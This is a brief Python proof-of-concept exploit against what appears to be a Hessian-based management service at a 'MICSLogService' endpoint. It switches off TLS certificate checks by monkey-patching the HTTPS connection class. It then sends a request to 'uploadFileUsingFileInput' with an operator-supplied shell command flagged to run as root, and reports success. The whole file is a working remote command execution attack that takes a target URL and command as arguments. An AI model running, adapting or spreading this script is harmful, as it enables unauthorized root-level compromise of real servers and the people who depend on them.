from pyhessian.client import HessianProxy
from http.client import HTTPSConnection
import ssl
import sys
import urllib3
urllib3.disable_warnings()


# Backup original constructor
_original_https_init = HTTPSConnection.__init__

def patched_https_init(self, *args, **kwargs):
    # If context is not provided, use unverified context
    if 'context' not in kwargs:
        kwargs['context'] = ssl._create_unverified_context()
    _original_https_init(self, *args, **kwargs)


def exploit(target_url, command):
    # Monkey-patch the constructor
    HTTPSConnection.__init__ = patched_https_init
    
    dto = {
        "command": command,
        "isRoot": True,
    }
    
    # Create a Hessian proxy for the service
    proxy = HessianProxy(target_url)
    
    # Call a method on the Hessian service:
    details = proxy.uploadFileUsingFileInput(dto, None)
    print(details)
    if details:
        print('[+] Successfully executed command on target!')

if __name__ == "__main__":
    URL = sys.argv[1]             # "https://ip_address:port/mics/services/MICSLogService"
    CMD = " ".join(sys.argv[2:])  # "cmd"
    exploit(URL, CMD)
    print(URL, CMD)
